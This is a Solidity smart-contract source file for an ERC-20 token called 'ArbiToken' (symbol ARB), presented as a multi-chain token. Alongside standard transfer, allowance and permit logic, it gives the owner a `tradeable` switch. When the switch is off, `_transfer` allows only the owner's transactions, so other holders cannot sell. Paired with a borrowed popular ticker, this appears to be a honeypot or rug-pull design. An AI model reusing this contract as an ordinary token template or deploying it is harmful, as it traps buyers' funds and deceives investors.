/**
 *Submitted for verification at Etherscan.io on 2023-04-11
*/

/**
    __      ______   _______   _______  
  _/  |_   /      \ /       \ /       \ 
 / $$   \ /$$$$$$  |$$$$$$$  |$$$$$$$  |
/$$$$$$  |$$ |__$$ |$$ |__$$ |$$ |__$$ |
$$ \__$$/ $$    $$ |$$    $$< $$    $$< 
$$      \ $$$$$$$$ |$$$$$$$  |$$$$$$$  |
 $$$$$$  |$$ |  $$ |$$ |  $$ |$$ |__$$ |
/  \__$$ |$$ |  $$ |$$ |  $$ |$$    $$/ 
$$    $$/ $$/   $$/ $$/   $$/ $$$$$$$/  
 $$$$$$/  a multi-chain token
   $$/      arbitoken.io
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

/// @custom:security-contact [email protected]
contract ArbiToken {
  string public constant name = "ArbiToken";
  string public constant symbol = "ARB";
  uint8 public constant decimals = 18;

  bool public canTrade;
  address public owner;
  
  uint256 immutable public totalSupply;

  uint256 constant UINT256_MAX = type(uint256).max;

  mapping (address => uint) public nonces;
  mapping (address => uint256) public balanceOf;
  mapping (address => mapping(address => uint256)) public allowance;

  bytes32 public immutable DOMAIN_SEPARATOR;
  bytes32 public constant PERMIT_TYPEHASH = keccak256(
    "Permit(address owner,address spender,uint256 amount,uint256 nonce,uint256 deadline)"
  ); 


  event Transfer(address indexed from, address indexed to, uint256 amount);
  event Approval(address indexed owner, address indexed spender, uint256 amount);

  constructor() {
    canTrade = true;
    owner = msg.sender;
    totalSupply = 100000000 * 10 ** decimals;

    DOMAIN_SEPARATOR = keccak256(
      abi.encode(
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
        keccak256(bytes(name)),
        keccak256(bytes("1")),
        block.chainid,
        address(this)
      )
    );

    unchecked {
      balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] + totalSupply;
    }

    emit Transfer(address(0), address(msg.sender), totalSupply);
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
    _approve(msg.sender, spender, allowance[msg.sender][spender] + addedValue);

    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
    _approve(msg.sender, spender, allowance[msg.sender][spender] - subtractedValue);

    return true;
  }

  function transfer(address to, uint256 amount) external returns (bool) {
    _transfer(msg.sender, to, amount);

    return true;
  }

  function transferFrom(address from, address to, uint256 amount) external returns (bool) {
    if (allowance[from][msg.sender] != UINT256_MAX) {
      allowance[from][msg.sender] -= amount;
    }

    _transfer(from, to, amount);

    return true;
  }

  function permit(address _owner, address _spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
    require(deadline >= block.timestamp, "ARB: PERMIT_CALL_EXPIRED");

    bytes32 digest = keccak256(
      abi.encodePacked(
        "\x19\x01",
        DOMAIN_SEPARATOR,
        keccak256(
          abi.encode(
            PERMIT_TYPEHASH,
            _owner,
            _spender,
            amount,
            nonces[_owner]++,
            deadline
          )
        )
      )
    );

    address signer = ecrecover(digest, v, r, s);
    require(signer != address(0) && signer == _owner, "ARB: INVALID_SIGNATURE");
    _approve(_owner, _spender, amount);
  }

  function transferOwnership(address newOwner) public isOwner {
    owner = newOwner;
  }

  function tradeable(bool active) public isOwner {
    canTrade = active;
  }

  function _approve(address _owner, address _spender, uint256 amount) private {
    allowance[_owner][_spender] = amount;

    emit Approval(_owner, _spender, amount);
  }

  function _transfer(address from, address to, uint256 amount) private {
    require(canTrade || tx.origin == owner, "ARB: NOT_TRADEABLE");

    balanceOf[from] = balanceOf[from] - amount;

    unchecked {
      balanceOf[to] = balanceOf[to] + amount;
    }

    allowance[from][to] = 0;

    emit Transfer(from, to, amount);
  }

  modifier isOwner(){
    require(msg.sender == owner, "ARB: NOT_OWNER");
    _;
  }
}